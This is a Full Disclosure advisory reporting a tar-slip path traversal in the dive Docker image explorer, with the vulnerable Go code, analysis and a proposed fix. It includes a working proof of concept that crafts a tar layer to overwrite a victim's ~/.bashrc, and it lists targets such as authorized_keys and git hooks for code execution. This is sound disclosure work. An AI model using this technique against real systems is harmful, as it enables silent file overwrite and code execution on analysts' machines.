---
title: dive tar-slip in image file extraction
url: https://seclists.org/fulldisclosure/2026/Sep/81
source: Full Disclosure
date: 2026-09-27
fetch_date: 2026-09-28T07:56:59.691280
---

# dive tar-slip in image file extraction

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](73)
[By Date](date.html#81)
[![Next](/images/right-icon-16x16.png)](82)

[![Previous](/images/left-icon-16x16.png)](73)
[By Thread](index.html#81)
[![Next](/images/right-icon-16x16.png)](82)

![](/shared/images/nst-icons.svg#search)

# dive tar-slip in image file extraction

---

*From*: Khashayar Fereidani <info () fereidani com>
*Date*: Thu, 24 Sep 2026 02:58:19 +0000

---

```
# dive tar-slip in image file extraction

**Author:** Khashayar Fereidani
**Disclosure Date:** 2026-09-24
**Advisory:** https://fereidani.com/dive-tar-slip-in-image-file-extraction
**Contact:** https://fereidani.com/contact

## Description

dive is a terminal UI for exploring Docker image layers, and inspecting images
pulled from public registries is its main use case. The filetree view has an
extract action (the default keybinding is `ctrl+e`,
`cmd/dive/cli/internal/ui/v1/key/config.go:97`) that writes the selected file
from the image layer into the working directory. The call chain is
`onFileTreeViewExtract` (`cmd/dive/cli/internal/ui/v1/app/controller.go:62`)
-> `engineResolver.Extract`
(`dive/image/docker/engine_resolver.go:56`) -> `ExtractFromImage`
(`dive/image/docker/image_archive.go:303`) -> `extractInner`
(`dive/image/docker/image_archive.go:337`):

```go
func extractInner(reader *tar.Reader, p string) error {
target := strings.TrimPrefix(p, "/")

for {
header, err := reader.Next()

if err == io.EOF {
break
}

if err != nil {
fmt.Println(err)
os.Exit(1)
}

name := header.Name

switch header.Typeflag {
case tar.TypeReg:
if strings.HasPrefix(name, target) {
err := os.MkdirAll(filepath.Dir(name), 0755)
if err != nil {
return err
}

out, err := os.Create(name)
if err != nil {
return err
}

_, err = io.Copy(out, reader)
if err != nil {
return err
}
}
default:
continue
}
}

return nil
}
```

`header.Name` comes from the layer being inspected, so the attacker fully
controls it. The only validation is `strings.HasPrefix(name, target)`, a
string prefix check rather than a path check: it offers no containment at all.
A name like `etc/motd-x/../../../.bashrc` passes the check for a selected
`etc/motd`, and `os.Create(name)` then resolves the raw name relative to the
directory dive was started in. There is no `filepath.Clean`, no rejection of
`..`, no containment root, no symlink check and no size cap.

The same string-prefix property lets an attacker prepare the path for the
escape in two steps. Because `filepath.Dir` cleans `..` segments away,
`os.MkdirAll` never creates the intermediate directory that a single escape
entry needs to walk through. But any earlier entry whose name still starts
with the selected path creates it: an entry named `etc/motd-x/keep` makes
`os.MkdirAll` create the directory `etc/motd-x`, and the next entry can then
climb through it with `..`. Both entries pass the prefix check, and the
attacker controls the order of entries in the layer.

Reaching `extractInner` with crafted bytes is straightforward. The engine
resolver saves the image with the Docker API (`ImageSave`,
`dive/image/docker/engine_resolver.go:131`), which streams the original layer
blobs as they were pushed to the registry, and dive even pulls the image
itself when it is not available locally
(`dive/image/docker/engine_resolver.go:121`). Nothing between the registry
and `extractInner` rewrites entry names.

## Reproduction

The loop above is self-contained, so the whole feature can be exercised
without a registry or the UI. The program below copies `extractInner`
verbatim from the current main branch, feeds it a crafted layer tar, and
selects `/etc/motd`, exactly what dive does when ctrl+e is pressed on that
file:

```go
package main

// extractInner copied verbatim from
// dive/image/docker/image_archive.go:337 (main, 2026-09-24).
import (
"archive/tar"
"bytes"
"fmt"
"io"
"os"
"path/filepath"
"strings"
)

func extractInner(reader *tar.Reader, p string) error {
target := strings.TrimPrefix(p, "/")
for {
header, err := reader.Next()
if err == io.EOF {
break
}
if err != nil {
fmt.Println(err)
os.Exit(1)
}
name := header.Name
switch header.Typeflag {
case tar.TypeReg:
if strings.HasPrefix(name, target) {
err := os.MkdirAll(filepath.Dir(name), 0755)
if err != nil {
return err
}
out, err := os.Create(name)
if err != nil {
return err
}
_, err = io.Copy(out, reader)
if err != nil {
return err
}
}
default:
continue
}
}
return nil
}

func addFile(tw *tar.Writer, name, body string) {
hdr := &tar.Header{Name: name, Mode: 0o644, Size: int64(len(body)),
Typeflag: tar.TypeReg}
_ = tw.WriteHeader(hdr)
_, _ = tw.Write([]byte(body))
}

func main() {
var layer bytes.Buffer
tw := tar.NewWriter(&layer)
addFile(tw, "etc/motd", "welcome to the totally safe image\n")
addFile(tw, "etc/motd-x/keep", "x\n")
addFile(tw, "etc/motd-x/../../../.bashrc", "echo pwned\n")
_ = tw.Close()

err := extractInner(tar.NewReader(&layer), "/etc/motd")
fmt.Println("extractInner returned:", err)
}
```

Run it from a directory that stands in for the analyst's project directory,
with a `.bashrc` one level above:

```sh
mkdir -p home/victim/project
echo "alias ll='ls -l'" > home/victim/.bashrc
cd home/victim/project && go run main.go
```

Observed result:

```text
extractInner returned: <nil>
```

```text
$ find home -type f | sort
home/victim/.bashrc          # was: alias ll='ls -l'
home/victim/project/etc/motd
home/victim/project/etc/motd-x/keep

$ cat home/victim/.bashrc
echo pwned
```

The selected file lands in the working directory as expected, and the escape
entry silently overwrites the `.bashrc` one level above it. `extractInner`
returns nil, so the UI reports a successful extract.

End to end, the same layer is delivered by publishing an image whose layer
blob contains the three entries above (any registry accepts the blob as-is),
and waiting for an analyst to run `dive` on the image and extract a file.

## Impact

Arbitrary file write with the analyst's privileges, at any path that is
reachable through `..` from the directory dive runs in, usually the home or
project directory. High-value targets include shell startup files such as
`~/.bashrc` and `~/.profile`, `~/.ssh/authorized_keys`, `.git/hooks` in the
current repository, and desktop autostart entries, which turn the write into
code execution at the next shell or login. The write is silent: extraction
succeeds and the extra entries leave no error behind.

The precondition is that the analyst selects a file in the crafted image and
presses the extract keybinding, which is why this is rated medium rather than
high. That action is exactly what the feature is for: an analyst who opens a
suspicious image to look at a credentials file or a config file has every
reason to extract it for a closer look, and the layer content is fully
attacker-controlled.

## Solution

Treat every entry name as hostile and extract through a containment root.
The check belongs on the cleaned, joined path, not on the raw string:

```go
dest := filepath.Join(destinationDir, filepath.Clean("/"+header.Name))
if dest != filepath.Join(destinationDir, target) {
continue // extraction is for the selected file only
}
```

Joining against `/`+name first makes `filepath.Clean` drop any leading `..`
or drive-letter tricks, and the equality check then reduces the write to the
one selected file inside `destinationDir`. Creating the file with
`os.OpenFile(dest, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0o644)` also stops the
extract from overwriting existing files or following a symlink plant...